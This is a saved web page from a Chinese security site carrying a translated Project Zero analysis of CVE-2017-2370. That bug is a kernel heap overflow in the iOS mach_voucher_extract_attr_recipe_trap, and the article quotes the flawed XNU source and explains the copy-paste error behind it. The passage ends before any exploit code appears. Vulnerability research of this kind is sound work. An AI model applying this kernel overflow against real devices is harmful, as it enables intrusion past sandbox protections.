@@ -1,0 +1,781 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+    <meta name="viewport"
+          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
+    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
+    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
+    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
+    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
+    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
+    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
+    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
+    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>
+
+        <title>【技术分享】深入分析基于异常的 iOS 漏洞利用技术   - 安全客 - 有思想的安全新媒体</title>
+    
+        <meta name="keywords" content="ios安全,移动安全,ios漏洞,ios漏洞利用"/>
+    
+        <meta name="description" content="本文将为读者详细介绍编号为CVE-2017-2370的mach_voucher_extract_attr_recipe_trap mach trap 堆溢出的发现和利用过程。这里不仅介绍了这个漏洞本身的情况，还讲解了漏洞利用技术的开发过程，包括如何反复故意导致系统崩溃，以及如何使用旧的内核漏洞构建活动内核自省功能。"/>
+        <meta property="wb:webmaster" content="224437c7be31d633"/>
+
+    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
+    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
+    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
+    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
+    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
+    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
+    (max-device-width:900px), only screen and (max-width:900px)" />
+    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
+    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
+    <script type="text/javascript" src="/js/iscroll.js"></script>
+    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
+    <script type="text/javascript">
+        var myScroll, myNavScroll;
+
+        function iscrollLoaded() {
+            myScroll = new IScroll('#wrapper',
+                {
+                    scrollX: true,
+                    scrollY: false,
+                    bounceEasing: 'circular',
+                    eventPassthrough: true,
+                    preventDefault: false,
+                    bounceTime: 500
+                }
+            );
+        }
+
+        $(function () {
+
+            //导航横向滚动
+
+
+            function setNavWidth() {
+
+                /* 计算导航宽度 */
+                var allWidth = $(window).width();
+                var scroller = $('#scroller');
+
+                if (allWidth > 900) {
+                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
+                    scroller.css('overflow', 'visible');
+                    if (myNavScroll) myNavScroll.destroy();
+                } else {
+
+                    var width = 0;
+                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
+                        if (!$(this).hasClass('mobile-hide')) {
+                            width += $(this).outerWidth();
+                        }
+                    });
+                    scroller.find('ul').add(scroller.find('.scroll')).width(width);
+
+                    if (myNavScroll) myNavScroll.destroy();
+
+                    myNavScroll = new IScroll('#scroller', {
+                        scrollX: true,
+                        scrollY: false,
+                        momentum: false,
+                        click: true
+                    });
+
+                }
+
+            }
+
+            setNavWidth();
+            $(window).resize(function (event) {
+                setNavWidth();
+            });
+
+        });
+
+    </script>
+</head>
+<body onload="iscrollLoaded();">
+<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
+    <img src=""/>
+</div>
+
+<div id="is-mobile"></div>
+<div class="container">
+        <div class="mobile-header">
+        <div class="header clearfix">
+            <div class="header-wrapper clearfix">
+                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
+                                <form id="search" class="search-box" action="/search/index" method="GET">
+                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
+                    <input class="icon" type="submit" value="">
+                    <input type="hidden" name="type" value=""/>
+                </form>
+                <div class="bug">
+                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
+                    <ul class="typelist">
+                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
+                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
+                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
+                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
+                    </ul>
+                </div>
+                                <div class="logNreg mobile-hide">
+                    <div class="unlog">
+                        <i></i>
+                        <a href="log.html" class="log">登录</a>
+                        <span>|</span>
+                        <a href="reg.html" class="reg">注册</a>
+                    </div>
+                    <div class="loged">
+                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
+                        <div class="user-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
+                                                               target="_blank"><i></i><span>账号设置</span></a></li>
+                                <li class="alert-setting"><a href="/keywords/index"
+                                                             target="_blank"><i></i><span>告警设置</span></a></li>
+                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
+                                </li>
+                                <li class="my-exit"><a
+                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
+                                </li>
+                            </ul>
+                        </div>
+
+                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
+                        <div class="message-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting" style="display:none;"><a href="/myres/index"
+                                                                                     target="_blank"><i></i><span>回复我的</span></a>
+                                </li>
+                                <li class="my-bug"><a href="/myvul/index"
+                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
+                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
+                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
+                                </li>-->
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <style type="text/css">
+            .nav {
+                overflow: hidden;
+            }
+
+            .nav .scroll {
+                width: auto;
+            }
+        </style>
+        <div id="wrapper">
+            <div id="scroller" class="nav">
+                <div class="scroll">
+                    <ul class="nav-list">
+                        <li ><a class="link-nav"
+                                                                                 href="/index/index">首页</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/vul/index">漏洞</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/introduce/list">招聘</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
+                        </ul>
+			-->
+                        </li>
+                        <li class="cur">
+                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/course/index">学院</a></li>
+                        </ul>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/activity/index">活动</a></li>
+                        <li class="mobile-hide "><a class="link-nav"
+                                                                                                   href="/ctf/index">CTF训练营</a>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/interref/list">安全内参</a></li>
+                        <li ><a class="link-nav" href="/app/index">APP</a></li>
+
+                        <!--<li ><a href="/course/index">学院</a></li>-->
+                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
+                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="mobile-content">
+        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
+<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
+<style>
+    p .syntaxhighlighter {
+        width: 80%;
+    }
+</style>
+
+<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>
+
+<div class="content clearfix">
+    <div class="main">
+        <div class="article">
+            <div id="article_box">
+                <h2>【技术分享】深入分析基于异常的 iOS 漏洞利用技术  </h2>
+                <div class="article-msg">
+                    <span class="time">2017-05-03 10:00:20</span>
+                    
+                                        <span class="read">阅读：10556次</span>
+                    <span><a style="display: none;" class="good" href="javascript:;"
+                             data-target="/learning/good" data-value="g_3799"
+                             data-type="learning">点赞(0)</a></span>
+                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
+                             data-pk="3799" data-type="learning">收藏</a></span>
+                                        <span><a style="margin-left: 4px;" class="fav" href="https://googleprojectzero.blogspot.jp/2017/04/exception-oriented-exploitation-on-ios.html"
+                             target="_blank">来源： googleprojectzero.blogspot.jp</a></span>
+                    
+                    
+                    <div style="margin-top:10px; ">
+                        <a href="/member/contribute?uid=2522399780" style="color:#848e99;">
+                            <img src="http://p1.qhmsg.com/dm/150_150_100/t00df551a583a87f4e9.jpg" data-is-avatar="true"
+                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
+                        </a>
+
+                    </div>
+                    <span class="orig">作者：<a href="/member/contribute?uid=2522399780" style="color:#848e99;">shan66</a></span>
+                                    </div>
+                <hr size="1">
+                <div class="article-msg">
+                    <p><!-- JiaThis Button BEGIN -->
+
+<!--
+<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
+	<a class="jiathis_button_weixin"></a>
+	<a class="jiathis_button_tsina"></a>
+    <a class="jiathis_button_tqq"></a>
+    <a class="jiathis_button_qzone"></a>
+    <a class="jiathis_button_renren"></a>
+    <a class="jiathis_button_xiaoyou"></a>
+    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+</span>
+
+-->
+</p>
+                </div>
+                <p><p style="text-align: center; text-indent: 0em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><img src="http://p8.qhimg.com/t016e80dfbc4f161907.jpg" title="t0159430af65b21b3c2.jpg" alt="http://p4.qhimg.com/t0159430af65b21b3c2.jpg"/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 112, 192); font-size: 18px; font-weight: 900;">翻译：</span><a href="http://bobao.360.cn/member/contribute?uid=2522399780" target="_blank" textvalue="shan66" style="text-decoration: underline; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px; color: rgb(0, 112, 192);"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px; color: rgb(0, 112, 192);"><strong>shan66</strong></span></a></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 112, 192); font-size: 18px; font-weight: 900;">预估稿费：300RMB</span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 112, 192); font-size: 18px; font-weight: 900;">投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿</span></p><p><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 112, 192); font-size: 18px; font-weight: 900;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">前言</span></strong></span><br/></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">本文将为读者详细介绍编号为<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1004" target="_self" style="color: rgb(227, 108, 9); text-decoration: underline;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; color: rgb(227, 108, 9);"><strong>CVE-2017-2370</strong></span></a>的mach_voucher_extract_attr_recipe_trap mach trap 堆溢出的发现和利用过程。这里不仅介绍了这个漏洞本身的情况，还讲解了漏洞利用技术的开发过程，包括如何反复故意导致系统崩溃，以及如何使用旧的内核漏洞构建活动内核自省功能。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这是一陷阱！</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">除了大量的<a href="https://developer.apple.com/library/content/documentation/Darwin/Conceptual/KernelProgramming/BSD/BSD.html" target="_self" style="color: rgb(227, 108, 9); text-decoration: underline;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; color: rgb(227, 108, 9);"><strong>BSD</strong></span></a>系统调用（如ioctl，mmap，execve等）之外，XNU还提供了少量其他的系统调用，通常称为mach陷阱，用来为内核的<a href="https://developer.apple.com/library/content/documentation/Darwin/Conceptual/KernelProgramming/Mach/Mach.html" target="_self" style="color: rgb(227, 108, 9); text-decoration: underline;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; color: rgb(227, 108, 9);">MACH</span></strong></a>特性提供支持。Mach 陷阱系统调用的号码是从0x1000000开始的。下面的代码来自定义陷阱表的<a href="https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html" target="_self" style="color: rgb(227, 108, 9); text-decoration: underline;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; color: rgb(227, 108, 9);"><strong>syscall_sw.c</strong></span></a>文件：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">/*&nbsp;12&nbsp;*/&nbsp;MACH_TRAP(_kernelrpc_mach_vm_deallocate_trap,&nbsp;3,&nbsp;5,&nbsp;munge_wll),
+/*&nbsp;13&nbsp;*/&nbsp;MACH_TRAP(kern_invalid,&nbsp;0,&nbsp;0,&nbsp;NULL),
+/*&nbsp;14&nbsp;*/&nbsp;MACH_TRAP(_kernelrpc_mach_vm_protect_trap,&nbsp;5,&nbsp;7,&nbsp;munge_wllww),</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">对于大多数Mach陷阱来说，它们实际上就是内核API的快速通道，并且也是通过标准MACH MIG内核API向外界提供接口的。例如，mach_vm_allocate也是一个可以在任务端口上调用的MIG RPC。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">由于避免了调用内核MIG API所涉及的序列化和反序列化所引起的开销，因此Mach陷阱能够为这些内核函数提供速度更快的接口。但是，由于没有提供复杂的代码自动生成功能，所以mach陷阱通常需要以手工方式完成参数解析，但是要想正确完成这项工作的话，那是非常需要技巧的。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在iOS 10中，mach_traps表中出现了一个新条目：&nbsp;</span></p><pre class="brush:plain;toolbar:false">/*&nbsp;72&nbsp;*/&nbsp;MACH_TRAP(mach_voucher_extract_attr_recipe_trap,&nbsp;4,&nbsp;4,&nbsp;munge_wwww),</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">mach陷阱入口代码会把从用户空间传递给该陷阱的参数打包到如下所示的结构中：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">&nbsp;&nbsp;struct&nbsp;mach_voucher_extract_attr_recipe_args&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;PAD_ARG_(mach_port_name_t,&nbsp;voucher_name);
+&nbsp;&nbsp;&nbsp;&nbsp;PAD_ARG_(mach_voucher_attr_key_t,&nbsp;key);
+&nbsp;&nbsp;&nbsp;&nbsp;PAD_ARG_(mach_voucher_attr_raw_recipe_t,&nbsp;recipe);
+&nbsp;&nbsp;&nbsp;&nbsp;PAD_ARG_(user_addr_t,&nbsp;recipe_size);
+&nbsp;&nbsp;};</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">然后将指向该结构的指针作为第一个参数传递给该陷阱的实现代码。值得注意的是，添加一个这样的新系统调用后，我们就可以从系统上的每个沙盒进程中调用它了。直至你到达一个没有沙箱保护的强制性访问控制钩子（并且这里也没有）为止。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们来看看陷阱代码：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">kern_return_t
+mach_voucher_extract_attr_recipe_trap(
+&nbsp;&nbsp;struct&nbsp;mach_voucher_extract_attr_recipe_args&nbsp;*args)
+{
+&nbsp;&nbsp;ipc_voucher_t&nbsp;voucher&nbsp;=&nbsp;IV_NULL;
+&nbsp;&nbsp;kern_return_t&nbsp;kr&nbsp;=&nbsp;KERN_SUCCESS;
+&nbsp;&nbsp;mach_msg_type_number_t&nbsp;sz&nbsp;=&nbsp;0;
+&nbsp;&nbsp;if&nbsp;(copyin(args-&gt;recipe_size,&nbsp;(void&nbsp;*)&amp;sz,&nbsp;sizeof(sz)))
+&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;KERN_MEMORY_ERROR;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在Linux上，copyin具有与copy_from_user相似的语义。它会从用户空间指针args-&gt; recipe_size中将4个字节复制到内核堆栈上的sz变量中，确保整个源区段真正位于用户空间中，如果源区段未完全映射或指向内核，则返回错误代码。这样，攻击者就能控制sz变量了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">&nbsp;&nbsp;if&nbsp;(sz&nbsp;&gt;&nbsp;MACH_VOUCHER_ATTR_MAX_RAW_RECIPE_ARRAY_SIZE)
+&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;MIG_ARRAY_TOO_LARGE;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">由于mach_msg_type_number_t是32位无符号类型，所以sz必须小于或等于MACH_VOUCHER_ATTR_MAX_RAW_RECIPE_ARRAY_SIZE（5120）。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">&nbsp;&nbsp;voucher&nbsp;=&nbsp;convert_port_name_to_voucher(args-&gt;voucher_name);
+&nbsp;&nbsp;if&nbsp;(voucher&nbsp;==&nbsp;IV_NULL)
+&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;MACH_SEND_INVALID_DEST;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">convert_port_name_to_voucher会在调用任务的mach端口命名空间中查找args-&gt; voucher_name mach端口名称，并检查它是否命名了一个ipc_voucher对象，如果是的话，则返回该凭证的引用。因此，我们需要提供一个有效的凭证端口，用于处理voucher_name。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">&nbsp;&nbsp;if&nbsp;(sz&nbsp;&lt;&nbsp;MACH_VOUCHER_TRAP_STACK_LIMIT)&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;keep&nbsp;small&nbsp;recipes&nbsp;on&nbsp;the&nbsp;stack&nbsp;for&nbsp;speed&nbsp;*/
+&nbsp;&nbsp;&nbsp;&nbsp;uint8_t&nbsp;krecipe[sz];
+&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(copyin(args-&gt;recipe,&nbsp;(void&nbsp;*)krecipe,&nbsp;sz))&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;kr&nbsp;=&nbsp;KERN_MEMORY_ERROR;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto&nbsp;done;
+&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;kr&nbsp;=&nbsp;mach_voucher_extract_attr_recipe(voucher,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;args-&gt;key,&nbsp;(mach_voucher_attr_raw_recipe_t)krecipe,&nbsp;&amp;sz);
+&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(kr&nbsp;==&nbsp;KERN_SUCCESS&nbsp;&amp;&amp;&nbsp;sz&nbsp;&gt;&nbsp;0)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;kr&nbsp;=&nbsp;copyout(krecipe,&nbsp;(void&nbsp;*)args-&gt;recipe,&nbsp;sz);
+&nbsp;&nbsp;}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如果sz小于MACH_VOUCHER_TRAP_STACK_LIMIT（256），那么这将在内核堆栈上分配一个小的可变长度数组，并将args-&gt; recipe中的用户指针的sz字节复制到VLA中。然后，该代码将在调用copyout（它需要用到内核和用户空间参数，作用与copyin相反）将结果送回用户空间之前，调用目标mach_voucher_extract_attr_recipe方法。好了，下面让我们来看看如果sz过大，为了保持速度继续让其留在堆栈上会发生什么：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">&nbsp;&nbsp;else&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;uint8_t&nbsp;*krecipe&nbsp;=&nbsp;kalloc((vm_size_t)sz);
+&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(!krecipe)&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;kr&nbsp;=&nbsp;KERN_RESOURCE_SHORTAGE;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto&nbsp;done;
+&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(copyin(args-&gt;recipe,&nbsp;(void&nbsp;*)krecipe,&nbsp;args-&gt;recipe_size))&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;kfree(krecipe,&nbsp;(vm_size_t)sz);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;kr&nbsp;=&nbsp;KERN_MEMORY_ERROR;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto&nbsp;done;
+&nbsp;&nbsp;&nbsp;&nbsp;}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们不妨仔细考察一下这个代码段。它调用kalloc在内核堆上分配了一段sz字节的内存，并将相应的地址分赋给krecipe。然后调用copyin，根据args-&gt; recipe用户空间指针复制args-&gt; recipe_size字节到krecipe内核堆缓冲区。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如果您还没有发现错误，请返回到代码段的开头部分，再重新阅读。这绝对是一个漏洞，只是乍一看，好像没有任何毛病！</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">为了解释这个漏洞，我们不妨探究一下到底发生了什么事情，才导致了这样的代码。当然，这里只是猜想，不过我认为这是相当合理的。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">copypasta相关代码&nbsp;</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">在mach_kernelrpc.c中，mach_voucher_extract_attr_recipe_trap方法的上面是另一个mach陷阱host_create_mach_voucher_trap的相关代码。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这两个函数看起来很相似。它们都有用于处理小型输入和大型输入的分支，在处理小型输入的分支上面都带有同样的/* keep small recipes on the stack for speed */ 注释，并且都在处理大型输入的分支中分配了内核堆。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">很明显，mach_voucher_extract_attr_recipe_trap的代码是从host_create_mach_voucher_trap那里复制粘贴过来的，然后进行了相应的更新。这不同的是，host_create_mach_voucher_trap的size参数是整数，而mach_voucher_extract_attr_recipe_trap的size参数是一个指向整数的指针。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这意味着mach_voucher_extract_attr_recipe_trap需要首先使用copyin处理复制size参数，然后才能使用。更令人困惑的是，原始函数中的size参数被称为recipes_size，而在较新的函数中，它被称为recipe_size（少了一个&#39;s&#39;）。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">下面是这两个函数的相关代码，其中第一个代码段很好，但是第二个代码中有安全漏洞：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">host_create_mach_voucher_trap:
+&nbsp;if&nbsp;(copyin(args-&gt;recipes,&nbsp;(void&nbsp;*)krecipes,&nbsp;args-&gt;recipes_size))&nbsp;{
+&nbsp;&nbsp;&nbsp;kfree(krecipes,&nbsp;(vm_size_t)args-&gt;recipes_size);
+&nbsp;&nbsp;&nbsp;kr&nbsp;=&nbsp;KERN_MEMORY_ERROR;
+&nbsp;&nbsp;&nbsp;goto&nbsp;done;
+&nbsp;}
+mach_voucher_extract_attr_recipe_trap:
+&nbsp;&nbsp;if&nbsp;(copyin(args-&gt;recipe,&nbsp;(void&nbsp;*)krecipe,&nbsp;args-&gt;recipe_size))&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;kfree(krecipe,&nbsp;(vm_size_t)sz);
+&nbsp;&nbsp;&nbsp;&nbsp;kr&nbsp;=&nbsp;KERN_MEMORY_ERROR;
+&nbsp;&nbsp;&nbsp;&nbsp;goto&nbsp;done;
+&nbsp;&nbsp;}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我的猜测是，开发人员复制粘贴了整个函数的代码，然后尝试添加额外的间接级别，但忘记将第三个参数更改为上面显示的copyin调用。他们构建XNU并考察了编译器错误消息。使用<a href="https://clang.llvm.org/" target="_self"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(227, 108, 9);">clang</span></strong></a>构建XNU时，出现了下面的错误消息：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">error:&nbsp;no&nbsp;member&nbsp;named&nbsp;&#39;recipes_size&#39;&nbsp;in&nbsp;&#39;struct&nbsp;mach_voucher_extract_attr_recipe_args&#39;;&nbsp;did&nbsp;you&nbsp;mean&nbsp;&#39;recipe_size&#39;?
+if&nbsp;(copyin(args-&gt;recipes,&nbsp;(void&nbsp;*)krecipes,&nbsp;args-&gt;recipes_size))&nbsp;{
